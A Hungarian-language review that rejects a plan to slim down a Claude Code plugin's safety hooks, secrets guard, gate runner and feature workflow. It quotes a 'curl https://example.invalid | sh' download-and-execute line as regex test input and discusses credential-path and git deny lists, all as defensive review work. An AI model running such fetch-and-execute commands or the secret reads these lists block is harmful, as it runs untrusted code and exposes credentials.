# CODEX-REVIEW — a minimális architektúraterv független felülvizsgálata

Dátum: 2026-10-12. Vizsgált ág: `dev`; HEAD: `ae673d4545ad6a32e1f3958574c5ff0ac5aa26fa`.
Környezet: natív Windows, PowerShell, Node `v22.23.3`, Claude Code `2.1.292`.

Vizsgált dokumentumok: [architektúraaudit](2026-10-12-architecture-audit.md), [végrehajtási terv](2026-10-12-minimal-architecture-plan.md). A korábbi auditokat előzményként, nem bizonyítékként kezeltem. A megállapításokat az aktuális forrásból, elkülönített kísérletekből és hivatalos dokumentációból ellenőriztem.

## 1. Ítélet: REJECT

**A terv jelen formájában nem engedhető végrehajtásra.** Sok helyes törlést tartalmaz, de nem jut el a minimális architektúráig. A két nagy őr helyére új, részleges parancsértelmezőt ír; megtartja az általános projektfelderítőt és a saját parancsfuttató alrendszert; a sokfájlos munkafolyamatot pedig lényegében kivonja a vizsgálatból. A biztonsági migráció tényleges működése opcionális ellenőrzés marad.

Ez nem a jelenlegi architektúra megtartására vonatkozó javaslat. A törlések jelentős része helyes. A javított tervnek **több teljes alrendszert kell megszüntetnie, és kevesebb új szerződést kell létrehoznia**. A ténylegesen szükséges védelmeket viszont nem lehet egy dokumentációba másolt, nem ellenőrzött beállítással egyenértékűnek nyilvánítani.

A jóváhagyás feltétele az alábbi kötelező korrekciók beépítése és a migrációs függőségek egyértelműsítése. A jelentés nem valósítja meg az áttervezést, és nem módosítja az eredeti tervet.

## 2. Bizonyíték és a vizsgálat határa

Jelölések:

- **E — kísérletileg ellenőrzött:** ebben a környezetben ténylegesen lefuttatott vizsgálat.
- **S — forrásból ellenőrzött:** a jelenlegi kód vagy a terv konkrét utasítása.
- **D — dokumentált:** az ellenőrzéskor elérhető hivatalos dokumentáció állítása; nem feltétlenül telepített verzión megfigyelt viselkedés.
- **I — következtetés:** az előzőekből levezetett architekturális értékelés.
- **U — nem ellenőrzött:** nincs megfelelő futási bizonyíték; ezt nem tekintem igazolt platformhibának vagy működő helyettesítésnek.

### Elvégzett ellenőrzések

| Ellenőrzés | Eredmény és korlát |
| --- | --- |
| `node scripts/validate.mjs` | E: mind a 10 ellenőrzés sikeres. A leírásbudget 6305/6500. |
| `claude plugin validate . --strict`, majd külön a `core`, `vue`, `nuxt` | E: mind sikeres. Ez önmagában nem bizonyítja a hookok vagy a skillek működését. |
| Teljes Node-tesztcsomag | E: 1733 teszt; 1727 sikeres, 2 hibás, 4 kihagyott; 89,0 másodperc. |
| A két hibás folyamatfa-/timeout-teszt ismétlése a korlátozott sandboxon kívül | E: 2/2 sikeres; 21,1 másodperc. A teljes csomagot nem futtattam újra korlátozás nélkül. A két első hibát nem minősítem bizonyított termékhibának. |
| Natív validátor mesterséges hibás komponensekkel | E: hibás skill-frontmatter mellett `success: true`, `contents: []`; ismeretlen manifestmezővel a `--strict` visszatérési kódja 1. |
| Monorepo-, commitlint-, hibás manifest-, typecheck- és npm-lifecycle-fixture | E: az F03–F04 megállapításokat reprodukálta. Nem futott valódi alkalmazás vagy ismeretlen projektkód. |
| A terv R6 reguláris kifejezése két karakterláncon | E: valódi shellbe pipe-olt letöltésre és pusztán azt idéző `echo` szövegre is illeszkedik. Nem készült új guardimplementáció. |
| `claude plugin eval init --bare codex-review-probe --eval-dir evals` elkülönített könyvtárban | E: sikeres fájlgenerálás; nem indított fizetős agentsessiont. |

A lokális futási nyomok a gitignored `temp/codex-review/` könyvtárban vannak: `baseline-tests.tap`, `process-tree-retest.tap`, `probes.mjs`, `probe-results.json`, valamint a fixture-ök. Ezek nem új termék- vagy CI-infrastruktúra; a lényeges bemeneteket és eredményeket ez a dokumentum önállóan is rögzíti.

Nem futott fizetős Claude-session, valódi eval, push, merge, reset vagy kiadás. Nem történt pluginimplementáció-módosítás. A meglévő `.gitignore` módosításhoz nem nyúltam. A fogyasztói permission-snippet, az attribution tényleges commitkimenete és az új guard teljes működése **U** maradt. Az attribution-reference hivatalos oldala a webes lekérés méretkorlátja miatt nem volt olvasható; a közvetlen hálózati lekérést a környezet blokkolta. Ez nem bizonyíték arra, hogy a terv attribution-szintaxisa hibás.

### A tényleges függőségi szerkezet

- A marketplace három plugint szállít: `core`, `vue`, `nuxt`; a Vue a core-ra, a Nuxt a core-ra és a Vue-ra támaszkodik. Nincs repo-szintű npm-függőség.
- A core 14 skillje és két agentje használja a projektfelderítés, ellenőrzés és snapshot különböző részeit. Az eredmények nemcsak programkódon, hanem promptmezőkön és Markdown-protokollokon keresztül terjednek.
- A fogyasztói hookok négy regisztrációja a `run.mjs` betöltőn keresztül hívja a két őrt, a formázót és a Stop-ellenőrzőt. A két őr közös shell-/credential-logikát használ; a Stop a gate-runnert, az pedig a facts modult használja.
- A repo saját két PostToolUse- és egy Stop-hookja a validátorra épül. Ugyanazt a validátort és a teszteket a CI is futtatja.
- A `validate.mjs` a `pack-graph.mjs` manifestfelderítését és a release-notes fejlécszabályát is fogyasztja. A graph CLI-jének eltávolítása ezért nem azonos a modul minden exportjának vak törlésével.
- A feature-folyamat hat alapdokumentumot, naplóbejegyzés-típusokat, dispatch-formákat, archiválást és régi formátumok olvasását tartja össze. Erre külön `contract-auditor` is épül. Ez érdemi architektúra, akkor is, ha Markdownban van.

## 3. Részletes megállapítások

### F01 — A védelmek átadása hiányos és ellenőrzés nélkül kiadható

**Súlyosság: BLOCKER. Kötelező.** Terv: §3.5–3.7, §7, §8.

**Hely:** `docs/plans/2026-10-12-minimal-architecture-plan.md:381–421, 427–450, 470–473`; `plugins/core/hooks/hooks.json:8–27`; `plugins/core/scripts/commit-hygiene.mjs`; `.claude/settings.json` permission-listái.

**Bizonyíték:** S: a jelenlegi commit-őr `Bash|PowerShell` hívásokra fut. Az új snippet kizárólag `Bash(...)` git-tiltásokat ír. S: az interaktív vizsgálat elmaradása esetén a terv kifejezetten továbbmegy; a hook-smoke is elhalasztható. A §7 Grep- és `@file`-ellenőrzést tulajdonít a §3.5-nek, de annak három próbája ezekre nem tér ki. A credential-listák sem egyenértékűek: a snippetből például a `secrets/`, a privátkulcs-kiterjesztések és a `credentials.json` hiányzik; az example-kivétel sem fedi az összes, guard által engedett sablont.

D: a PowerShellnek saját permission-szabályai vannak. A Bash-prefixszabályok és a fájltiltások dokumentált korlátokkal működnek. A pluginsettings nem általános jogosultságtelepítési mechanizmus. [Permission-dokumentáció](https://code.claude.com/docs/en/permissions), [pluginbeállítások](https://code.claude.com/docs/en/plugins/components).

**Miért hibás:** a dokumentációban szereplő ajánlás nem telepíti át a korábbi fogyasztók effektív beállításait. A terv egyszerre ismeri el a `git -C . push` kerülőutat, és nevezi a snippetet „a határnak”, illetve determinisztikus rétegnek. A `merge-base` esetleges blokkolására a merge-tiltás teljes elhagyása nem megfelelő fallback. A tiltott `git pull` az eddig megengedett rebase-folyamatot is érinti.

**Legegyszerűbb korrekció:** előbb írja le pontosan a termék támogatott védelmi szerződését és a tudatosan megszűnő garanciákat. Egyetlen dokumentált, platformonként helyes natív beállításminta legyen, másolatai helyett hivatkozásokkal. A régi fogyasztók számára legyen egyértelmű migrációs lépés és kiadási megjegyzés. Ne épüljön új git-parancsparser. A natív szabályokat ne nevezze teljes körű elszigetelésnek.

**Elfogadás:** a módosított terv a kiadás előfeltételévé teszi az effektív beállítások ellenőrzését a támogatott Bash- és PowerShell-környezetben; felsorolja a normál olvasás, engedett sablon, titokútvonal, push/merge/pull-rebase, `merge-base`, Grep/`@file` és attribution elvárt eredményeit. „Nem futott” eredménnyel a védelmi migráció nem jelölhető késznek. A mostani review-nak ehhez nem kell fizetős sessiont indítania.

### F02 — Az új guard a törölt parser következő generációja

**Súlyosság: HIGH. Kötelező.** Terv: §3.1–3.4, §3.7, §7, §9.

**Hely:** terv `:289–301, 351–379, 466–468, 652–653`; összehasonlítás: `plugins/core/scripts/block-secrets.mjs:219–247`, `plugins/core/scripts/lib/shell-parse.mjs`.

**Bizonyíték:** S: az R4 heredocot távolít el, szegmensekre bont, wrapperneveket fejt le, első szót normalizál, olvasóprogramokat és argumentumkivételeket osztályoz. Az R2 globot alakít és brace-expanziót végez. Ez részleges nyelvértelmezés attól függetlenül, hogy nem nevezik parsernek. A `CRED` külön regexben újramondja a megosztott credential-függvény szemantikáját.

E: a terv R6 mintája a `curl https://example.invalid | sh` és az `echo "curl https://example.invalid | sh"` szövegekre egyaránt illeszkedik. S/I: az `env` egyszerre eltávolítandó wrapper és az R7-ben keresett parancs; a kötelező `sudo -E env` esethez a wrapperopciók kezelését nem adja meg a szerződés. Egy friss végrehajtónak tehát mégis nyelvtani döntéseket kell hoznia.

**Miért hibás:** a 120 soros plafon nem korlátozza a viselkedési komplexitást. A „minden új hibára regex-bővítés” előírás ugyanazt a növekedési mechanizmust rögzíti, amely a jelenlegi őrt túlméretezte. A kihagyott esetekre előírt `allow` tesztek ráadásul egy képesség hiányát teszik örök szerződéssé. Két spawn-teszt nem ellenőrzi az összes korpuszsort a wrapperen, ahogy a §3.7 állítja.

**Legegyszerűbb korrekció:** az R4–R7 shellértelmező réteget törölje a célarchitektúrából; ne finomítsa a regexeket. Az F01 rendezése után legfeljebb egy szűk, strukturált fájleszköz-inputon működő balesetvédő hook maradjon, ha ennek alapértelmezett szállítását konkrét követelmény indokolja. A Grep-globkezelés sem válhat második globmotorrá. A támogatási körön kívüli viselkedést dokumentálja, ne tegye kötelezően engedélyezendő API-vá.

**Elfogadás:** nincs reader-/wrapperlista, heredocfeldolgozás, shellszegmentálás vagy feltöltés-/letöltésparancs-felismerés az új tervben. A maradó hook minden szabályához külön megnevezett, natív konfigurációval nem teljesített szükséglet tartozik. A tesztmátrix külön kezeli a tiszta döntési függvényt és a hookfolyamat exit-kódját.

### F03 — A `run-gates` alrendszert törölni kell, nem kisebb runnerként konzerválni

**Súlyosság: HIGH. Kötelező a célarchitektúra újratervezése.** Terv: §2.2–2.4, §4.1, §8.

**Hely:** `plugins/core/scripts/run-gates.mjs:81–87, 167–192, 202–274, 286–395, 423–499`; terv `:189–211`.

**Bizonyíték:** S: a megtartott funkciók közt marad watcherfelismerés, npm-scriptláncok egy szintű követése, fixer-flagkeresés, stage- és override-modell, Nuxt-specifikus typecheck-heurisztika, hibaszöveg-osztályozás és többplatformos folyamatfa-kezelés.

E: egy fixture `lint` scriptje csak sikeresen kilépett, de az npm által automatikusan meghívott `prelint` létrehozott egy jelzőfájlt. A runner `pass` eredményt adott. E: a `cd apps/web && vue-tsc --noEmit` parancsot a root Nuxt solution-tsconfig alapján „nincs input” indokkal kihagyta, miközben az alkalmazás saját tsconfigja nem üres inputot tartalmazott. Ez a rossz munkakönyvtáron alapuló elutasítást igazolja; valódi compilerfutást nem végeztem.

**Miért hibás:** a parancsszöveg-heurisztika nem bizonyítja, hogy egy projektparancs nem módosít fájlt vagy ténylegesen ellenőriz valamit. Újabb lifecycle-, alias-, wrapper- és fordítóesetek felvétele csak tovább növeli a problémát. A Stop-hook törlése után nincs automatikus hookfogyasztó, amely önmagában indokolná a saját általános futtatót. A `passed` eltávolítása és a hibás manifest javítása helyes, de nem igazolja a maradék réteget.

**Legegyszerűbb korrekció:** törölje a runner CLI-t, stage-konfigurációját, hibaszöveg-adatbázisát és JSON-protokollját. A skill az adott workspace manifestjéből és CI-jából kiválasztott, konkrét parancsot futtassa a natív eszközzel. Egy közös rövid útmutató rögzítse: munkakönyvtár, parancs, kilépési kód, releváns kimenet, nem futtatott ellenőrzés oka. A Vue/Nuxt tudás maradjon a megfelelő packban.

**Elfogadás:** nincs `run-gates.mjs`, gate-override vagy annak helyettesítő runnerje. Minden korábbi fogyasztó konkrét parancsbizonyítékot kér; hiányzó parancs és hibás manifest nem válik sikeres ellenőrzéssé. Egy megszakítható, egy sikertelen és egy sikeres eldobható ellenőrzés igazolja a választott natív futtatási utat. Nem állítható mérés nélkül, hogy a natív eszköz folyamatfa-kezelése mindenben azonos a jelenlegivel.

### F04 — A `project-facts` nem tényeket, hanem több helyen hibás következtetéseket szállít

**Súlyosság: HIGH. Kötelező.** Terv: §4.1–4.2; audit §2.2, §3.1.

**Hely:** `plugins/core/scripts/project-facts.mjs:148–193, 217–260, 460–475, 534–600`; `verifying-ui/SKILL.md:53`, `describing-changes/SKILL.md:27`, `preparing-a-repo/SKILL.md:47` a `plugins/core/skills/` alatt.

**Bizonyíték:** E: a root `workspaces: ["apps/web"]`, az `apps/web` Vue-alkalmazás, az `apps/unlisted` pedig nem deklarált Nuxt-mappa volt. A detektor Nuxt packokat és az utóbbi mappa devserverét választotta; a root gate-eket hiányzónak írta, a tényleges alkalmazás scriptjei ellenére. S: a mappabejárás nem a deklarált workspace-listát követi. E: egy önmagában létező `commitlint.config.js` `enforced: true` eredményt adott hook vagy CI nélkül.

S: az audit 104. sora 13 `!`-injektálással érvel. A forrásban három ilyen injektálás van; a többi fogyasztási mód más. S: a terv a `workspaceStacks` változót is törölné, de ez nem csak kimeneti mező: a root stack fallbackjét is hajtja. Ennek helyettesítő viselkedését nem definiálja.

**Miért hibás:** sok fogyasztó ugyanattól a téves globális következtetéstől függ. Az olvasók száma migrációs költség, nem a központi adatmodell létjogosultságának bizonyítéka. Egy commitüzenethez nincs szükség minden böngésző-, szerver- és stackadat előállítására. A 12/14 mezős schema továbbra is felesleges csatolásokat tart fenn.

**Legegyszerűbb korrekció:** törölje az általános facts API-t és override-sémáját. A feladat által érintett workspace legyen explicit; a skill a szükséges manifestet, CI-fájlt vagy gitadatot akkor olvassa, amikor valóban kell. A keretrendszer-pack kiválasztását egy rövid közös útmutató és a dispatch rögzítse, ne új detektor. Ne másolja vissza a jelenlegi heurisztikákat 13 skillbe.

**Elfogadás:** a javított terv minden jelenlegi facts-fogyasztóhoz megadja a konkrét szükséges bemenetet, vagy törli a fogyasztást. Nincs globális `facts` JSON, `enforced` találgatás, nem deklarált mappákból származó stackválasztás, felesleges remote-injektálás. A mono-/multi-workspace dispatch az érintett csomagot nevezi meg.

### F05 — A snapshot review-segédeszközből túl széles helyreállítási ígéret lett

**Súlyosság: HIGH. Kötelező.** Terv: §6.1, §8; az audit snapshot-KEEP döntése.

**Hely:** `plugins/core/scripts/snapshot.mjs:4–16, 90–125`; `plugins/core/skills/executing-plans/SKILL.md:215–216`; `plugins/core/skills/syncing-branches/SKILL.md:74–91`; `plugins/core/skills/syncing-branches/references/conflicts.md:188–208`.

**Bizonyíték:** S: a script egy privát indexből elérhetetlen Git-tree-t ír, refet nem hoz létre. Kihagy credential- és temp-utakat, ignored fájlokat, submodule-munkafaállapotot; nem tárolja külön az index és a munkafa eltérő változatát. A fejléc maga is leírja a garbage collectiont és a submodule-korlátot. A fogyasztók viszont „recovery point”-ként és reset utáni visszaállítás forrásaként használják. A credential-korlátot a conflict-útmutató már jelzi; tehát nem teljesen elhallgatott kockázatról van szó.

D: a natív checkpoint sem minden shell- és subagentmódosítás teljes backupja. Emiatt annak vak helyettesítésként javaslása szintén hibás lenne. [Checkpoint-korlátok](https://code.claude.com/docs/en/checkpointing).

**Miért hibás:** az index érintetlensége nem egyenlő az index helyreállíthatóságával. Egy review-tree valódi és hasznos többlet a sima `git diff` mellett; ez nem indokol hosszú távú vagy teljes munkafa-backupgaranciát. A terv csak egy CLI-opciót töröl, a kockázatos fogyasztói jelentést érintetlenül hagyja.

**Legegyszerűbb korrekció:** a snapshot maradjon rövid életű review-alap, dokumentált lefedettséggel. A tartós recovery- és reset-visszaállítási ígéret kerüljön ki ebből a szerződésből. A destruktív gitfolyamat az adott helyzetnek megfelelő, explicit mentést és annak ellenőrzését követelje meg; ne készüljön új snapshot-kezelő alrendszer.

**Elfogadás:** a terv szétválasztja a review-diffet és a helyreállítást. Külön kezeli a staged/unstaged különbséget, az excluded/ignored állományokat, a submodule-t és az objektum elérhetőségét. Egy tree-azonosító önmagában nem jogosít resetre. Az indexváltozatlanságot ellenőrző meglévő teszt megmarad.

### F06 — A snapshot felülírásvédelmét rossz szinten tervezi meg

**Súlyosság: MEDIUM. Kötelező.** Terv: §6.1, `:624–626`.

**Hely:** `plugins/core/scripts/snapshot.mjs:132, 156–159`.

**Bizonyíték:** S: a célfájl a repository gyökeréhez képest oldódik fel, majd `openSync(file, 'w')` nyitja meg. A terv a `writeDiff` elején kér előzetes létezésvizsgálatot. E: alkönyvtári cwd mellett a nyers relatív `out` ellenőrzése hamis eredményt adhat, miközben a tényleges cél már létezik. I: egy helyes előzetes ellenőrzés és a megnyitás közé is ékelődhet másik írás; a default név ütközését is kezelni kell.

**Legegyszerűbb korrekció:** a már feloldott végső célútvonalat exkluzív létrehozással, `openSync(file, 'wx')` nyissa meg. Ne készüljön külön útvonal-/felülírásvédelmi helper.

**Elfogadás:** létező cél esetén a tartalom változatlan marad; az ellenőrzés rootból és alkönyvtárból is helyes, explicit és default célra egyaránt. Ez néhány eset a meglévő snapshot-tesztben, nem új tesztkeretrendszer.

### F07 — A terv a legnagyobb prózai állapotgépet megóvja a szükségességi vizsgálattól

**Súlyosság: HIGH. Kötelező újratervezési pont.** Terv: §4.4–4.5, §6.2; audit §3.6.

**Hely:** `plugins/core/skills/planning-features/references/artifacts.md:7–23, 80–130, 175–302, 314–326`; `plugins/core/skills/reviewing-changes/SKILL.md:90–121, 160–205`; `.claude/agents/contract-auditor.md:16–19, 43–49`.

**Bizonyíték:** S: hat alapdokumentum, külön kérdés-/döntésarchívum, 60 naplóbejegyzés utáni mozgatás, az utolsó 20 megtartása, régi egysoros formátumok kezelése és archívumban is kereső QA-/re-review-szabályok. A review 400 sor vagy 15 fájl felett több lencsét, deduplikálást és ellenőrző agentet rendel; minden dispatchhez fix `opus` modellt ír. Az audit ezt a réteget kifejezetten csak „script-csatolás mentén” változtatja.

**Miért hibás:** a mechanikus szerződések Markdownba helyezése nem szünteti meg azok karbantartási költségét. A jelenlegi kismunkás útvonal már több helyen elkerüli a nagy folyamatot; ezt elismerem. A nagy feature-ök protokolljának teljes megőrzéséhez viszont nincs bemutatott baseline-összehasonlítás. A sor-/fájlszám automatikus agentköltséggé alakítása sem demonstrált szükséglet.

**Legegyszerűbb korrekció:** alapértelmezésben egy tervdokumentum és szükség esetén egy folytatási összefoglaló elegendő; külön követelmény, döntésnapló vagy QA-artefaktum csak tényleges tartalmi igénnyel keletkezzen. Törlendő az általános eseménynapló-formátum, az automatikus archívumprotokoll és a tartós formátumkompatibilitási réteg. A review alapútvonala egy reviewer legyen; további független vizsgálatot a feladat kockázata vagy a felhasználó kérése indokoljon.

**Elfogadás:** a javított terv az összes lifecycle-írót és -olvasót együtt kezeli, egy meglévő feature folytatásának egyszeri átállását is leírja, és nem hagy árva ledger-/archive-mezőket. Nem épül univerzális konverter. A külön reviewer megtartható, de nincs kötelező sokagentű fan-out és fix modellválasztás pusztán méretküszöb miatt. A megmaradó fájlok mindegyikének önálló információs szerepe van.

### F08 — A repo Stop-hookját is törölni kell

**Súlyosság: MEDIUM. Kötelező a minimális célhoz.** Terv: §5.1–5.5.

**Hely:** `scripts/hooks/on-stop.mjs`; `.claude/settings.json`; `devkit.config.json:5–8`; `.github/workflows/validate.yml:50–59`; terv `:574–592`.

**Bizonyíték:** S: a javasolt új Stop-hook a piszkos gitállapotot összeveti egy watch-listával, majd ugyanazt a validátort indítja, amelyet a fázisvégi parancsok és a CI már futtatnak. Új, külön hooktesztet is kap. A git dirty állapot nem azt mutatja, hogy az aktuális beszélgetési körben változott-e releváns fájl.

**Miért hibás:** a fogyasztói automatikus Stop-futtatás megszűnik, a szerzői változata bizonyított szükséglet nélkül marad. A kisebb hook továbbra is ismételt folyamatindítás, konfiguráció, leállítási szemantika és külön tesztcsalád.

**Legegyszerűbb korrekció:** mindhárom repo-hook és a teljes `scripts/hooks/` réteg törlése; a `stopHook` konfiguráció és a tervezett `on-stop.test.mjs` elhagyása. Maradjon explicit validáció és CI.

**Elfogadás:** nincs repo PostToolUse/Stop regisztráció vagy watch-/testWatch-beállítás. A release és a CI ugyanazt a szükséges ellenőrzést futtatja; nincs helyettesítő automatikus körvégi mechanizmus.

### F09 — A törlési terv több konkrét fogyasztót és tesztet kihagy

**Súlyosság: HIGH. Kötelező.** Terv: §1.5–1.8, §4.5, §6.1–6.3.

**Hely és bizonyíték (S):**

- `scripts/test/validate.test.mjs:292–309` továbbra is megköveteli a lokális skill-scriptek szintaxisellenőrzését, miközben §1.5 eltávolítja ezt a keresési gyökeret. A §1.7 nem nevezi meg ezt a tesztcsoportot.
- `scripts/test/pack-graph.test.mjs:90–112` a nyomtatott referenciapárokat és `families[].references` mezőket fogyasztja. Nem elég „compareReferences/normalise eseteket” törölni: ezek más nevű fogyasztói tesztek.
- A §1.7 helyesen kéri a hooklétezési assertion ellenőrzését. Ennek most ellenőrzött eredménye: a `scripts/test/parse.test.mjs:43–47` kifejezetten megköveteli a core `hooks.json` létezését, a `scripts/validate.mjs:394` viszont hiányzó hookfájlnál továbbmegy. A meglévő scripts-checkre hivatkozás tehát önmagában nem elég; a feltételes tervutasítást konkrét tesztáthelyezéssé kell pontosítani, amennyiben hook marad. Ez tisztázott végrehajtási feltétel, nem teljesen elfelejtett tervpont.
- `.claude/skills/new-pack/SKILL.md:74` a törlendő `docs-links` ellenőrzésre hivatkozik.
- `docs/adr/0010-shared-version-and-release-branch-model.md:32`, `0011-cross-platform-and-observed-platform-claims.md:30`, `0012-tooling-values-in-config-not-prose.md:29` megváltozó vagy megszűnő mechanizmusokat ír le.
- `plugins/core/skills/verifying-ui/references/browser-tools.md:107` a törlendő `browserTools.servers[].toolPrefix` kimenetet ígéri; az audit csak a korábbi bekezdést nevezi meg.
- `.mcp.json:5` továbbra is `chrome-devtools-mcp@latest`, bár az audit §1.5/§3.2 a rögzítést elfogadott döntésként sorolja fel; a végrehajtási tervből ez kimaradt. A kapcsolódó browser-tools referencia `:56` már most tévesen állítja, hogy a CI pinel.

**Miért hibás:** egy friss session nem tud minden fázist az előírt módon zöldre zárni pusztán a megadott listát végrehajtva. A hiányzó hookregisztrációt nem pótolja a hookfüggvény egységtesztje. A korábbi ADR-eket nem kell meghamisítani, de jelenidejű utasításaikat amend/superseded jelzéssel rendezni kell.

**Legegyszerűbb korrekció:** fázisonként név szerint sorolja fel a közvetlen fogyasztókat, teszteket és aktív dokumentációt. A történeti említést különítse el a futtatandó utasítástól. Az MCP-konfigurációról hozzon explicit döntést: ha szükséges, a dokumentált és ténylegesen ellenőrzött verzió legyen konzisztens; ha nem szükséges automatikusan a repohoz, a konfiguráció törölhető.

**Elfogadás:** a felsorolt fogyasztók mind kapnak műveletet a tervben; a törölt mezőre/scriptre nincs aktív utasítás. A megmaradó hookregisztráció létezését és helyes célját egyetlen teszt ellenőrzi. Minden fázis a saját változásával együtt aktualizálja a vonatkozó teszteket.

### F10 — A csak olvasó reviewer átállása nem ér véget a frontmatternél

**Súlyosság: MEDIUM. Kötelező.** Terv: §4.3–4.5.

**Hely:** `plugins/core/agents/reviewer.md`; `plugins/vue/skills/vue-engineering/SKILL.md:33–43`; `plugins/nuxt/skills/nuxt-engineering/SKILL.md:32–40`; `plugins/core/skills/reviewing-changes/SKILL.md:205`.

**Bizonyíték:** S: a reviewer új eszközlistája `Read, Grep, Glob, Skill`; az általa betöltendő két framework-skill ugyanakkor `node -p ...` parancsot ad a verziók felderítésére. A terv a dispatch új sorait kezeli, de ezt az ellentmondást nem oldja fel. D: az agent eszközlistája valódi hozzáférési korlátozás. [Subagent-eszközök](https://code.claude.com/docs/en/sub-agents).

**Legegyszerűbb korrekció:** a packok a megfelelő workspace `package.json` fájlját `Read` eszközzel olvastassák; a dispatch adja át a konkrét workspace-et és a már lefutott ellenőrzések bizonyítékát. Ez nem igényel Bash-t vagy facts API-t a reviewerben.

**Elfogadás:** az első review, a verifier — ha külön indokolt — és a re-review sem igényel tiltott parancsot. Hiányzó gate-bizonyíték esetén a reviewer hiányt jelent, nem találgat és nem minősít sikeresnek nem futtatott ellenőrzést.

### F11 — A canary hibáját a terv könnyen zöld workflow mögé rejti

**Súlyosság: MEDIUM. Kötelező a megfigyelhetőség; a pin központosítása opcionális.** Terv: §1.3–1.4, §7.

**Hely:** terv `:65–83, 100, 658`; `.github/workflows/validate.yml`; `.github/workflows/release.yml`.

**Bizonyíték:** S: a terv `continue-on-error: true` mellett „piros canary”-ra alapoz. D: ez a beállítás megakadályozhatja, hogy a hibás job a workflow-t hibásnak minősítse; a szokásos sikertelen-workflow értesítésre ezért nem lehet feltétel nélkül támaszkodni. [GitHub Actions szemantika](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax). S: a rögzített CLI-verzió két workflow-ba kerül, noha a szöveg egy frissítési helyet ígér.

**Legegyszerűbb korrekció:** a heti/manuális latest-ellenőrzés ténylegesen hibás eredménnyel záruljon, de ne legyen a PR kötelező latest-kapuja. Nem kell új értesítő bot vagy monitoringkeretrendszer. Két pinérték tudatos dokumentálása is jobb, mint a hamis „egy hely” állítás; emiatt önmagában nem indokolt reusable workflow.

**Elfogadás:** a terv pontosan megnevezi, hol látható és hogyan jelez a canary hibája, miközben a stabil ellenőrzés rögzített verziót használ. A verzióemelési checklist az összes tényleges pinhelyet tartalmazza. A tag–manifest–changelog egyezésre tervezett release-kapu megmarad.

### F12 — A hookból futó projektkód bizalmi modelljének indoklása tényszerűen hibás

**Súlyosság: HIGH. Kötelező szöveges korrekció.** Terv: §2 indoklási alapja; audit §1.4, §2.3.

**Hely:** `docs/plans/2026-10-12-architecture-audit.md:73, 126`; `plugins/core/scripts/verify-before-done.mjs:151–285`; `plugins/core/scripts/format-on-write.mjs`.

**Bizonyíték:** S: az audit szerint a hook nem nyit új bizalmi határt, mert a modell ugyanazt a parancsot Bashből is futtathatná. D: a hookfolyamatok nincsenek a Bash-sandboxban; a natív Windows sandboxhiánya sem jelenti a permission-rendszer hiányát. [Sandbox hatóköre](https://code.claude.com/docs/en/sandboxing). I: az automatikus hookfuttatás és az agent által kezdeményezett, eszközengedélyezésen átmenő parancs nem azonos végrehajtási út.

**Miért hibás:** a képesség és az engedélyezett konkrét végrehajtás összekeverése eltünteti az automatikus projektkódfuttatás lényeges kockázatát. A „Windowson csak hook véd” állítás szintén túlzó.

**Legegyszerűbb korrekció:** tartsa meg a Stop- és formázóhook törlését, de a bizalmi határt helyesen indokolja. Ne állítsa, hogy minden ilyen hook P0 incidens; a tényleges kockázat a projektkódtól, engedélyektől és környezettől függ.

**Elfogadás:** az audit és a terv különválasztja az OS/sandbox korlátot, az eszközengedélyt és a hookfolyamatot. Az automatikus projektparancs-futtatás sem más hookban, sem háttérhelperben nem épül vissza.

### F13 — A natív eval lehetőségei alulhasználtak, a settings-smoke helyettesítését túlbecsüli a terv

**Súlyosság: MEDIUM. Kötelező a hatókör tisztázása; a szerzői skill összevonása opcionális.** Terv: §1.1, §1.8, §7; az audit repo-agent KEEP döntései.

**Hely:** `.claude/skills/eval-case/SKILL.md:52–55`, ugyanitt `templates/`; `.claude/agents/trigger-tester.md:16–22, 49–56`; terv `:659`.

**Bizonyíték:** E: a natív `plugin eval init --bare` fizetős modellfutás nélkül létrehozta az alapfájlokat. D: a natív eval betölti a tesztelt plugin hookjait, miközben a felhasználó/projekt settings- és hookkörnyezete izolált; a scaffold sem általános helyi settings-telepítési út. [Hivatalos eval-dokumentáció](https://code.claude.com/docs/en/plugin-evals). S: a `trigger-tester` a leírás alapján jósolja meg a tüzelést, nem a tényleges Skill-hívást figyeli meg.

**Miért hibás:** a saját driver/fake CLI törlése helyes, de a natív fájlgenerálás mellé nem kell második sablongenerátor. A leírást bíráló agent eredménye nem triggerbizonyíték. A két elmaradt kézi smoke után írandó eval viszont nem automatikusan egyenértékű a fogyasztói settings ellenőrzésével.

**Legegyszerűbb korrekció:** a natív init legyen az egyetlen scaffoldingút. A jó evalmódszertan maradjon egy rövid útmutatóban; a külön sablonok és a triggerjósló persona elhagyható. Tényleges routingállításhoz a megfelelő natív tool-használati grader használható, amikor erre engedélyezett futás történik. A plugin-hook evalját és a fogyasztói settings integrációs próbáját külön nevezze meg.

**Elfogadás:** nincs saját CLI-protokoll, scenario-DSL vagy új fake CLI. A javított terv nem állítja, hogy az eval kizárja a pluginhookokat, vagy hogy automatikusan igazolja a felhasználói deny/attribution beállításokat. A mostani review részeként nem kell valódi evalt futtatni.

### F14 — A friss sessionre szánt terv több ponton belsőleg ellentmondásos

**Súlyosság: MEDIUM. Kötelező.** Terv: §0, §1.8, §4.1, §6.3, §7, §9–10.

**Hely:** terv `:17–38, 160–162, 229, 494–499, 550, 635–645, 651–659, 679–708`; audit `:104, 124, 214`.

**Bizonyíték és javítás:**

- S: a schema 12 kulcsosnak mondott, a felsorolás és a mátrix 14-et tartalmaz. Törölt facts API esetén mindkét állítás megszűnik; megtartott átmeneti formánál egyetlen pontos szerződés kell.
- S/E: a reviewerre hivatkozó `:557`, illetve auditbeli `:687–689` helyek nem léteznek ebben a 198 soros fájlban. Használjon ellenőrzött helyet és szakasznevet.
- S/E: a kiinduló státusz nem csak a `.gitignore` módosítása, hanem az átadott, még nem követett `docs/plans/` is. A kezdeti engedmény után a terv mégis üres gitállapotot követel. Az előzetes változásokat rögzíteni és megőrizni kell, nem a tisztasági feltétel kedvéért commitolni vagy eltüntetni.
- S: a §10 Bash-ciklusa PowerShellben nem fut. A `wc` és `**` globkiterjesztés is shellfüggő. Ne írjon új mérőscriptet; adjon meg explicit shellt vagy közvetlen PowerShell-kompatibilis parancslistát.
- S: a régi Node-verziókon garantált indulási hiba nem következik a verzióellenőrző törléséből. Helyes állítás: az adott minimum alatti verzió nem támogatott; pontos hibaviselkedés csak mérésből állítható.
- S: a teljes követett állományra előírt legfeljebb 25 verzióemlítés történeti changelog-/ADR-bizonyítékot is büntet. Csak aktív, normatív leírást ellenőrizzen; történelmet ne töröljön egy számmérő kedvéért.
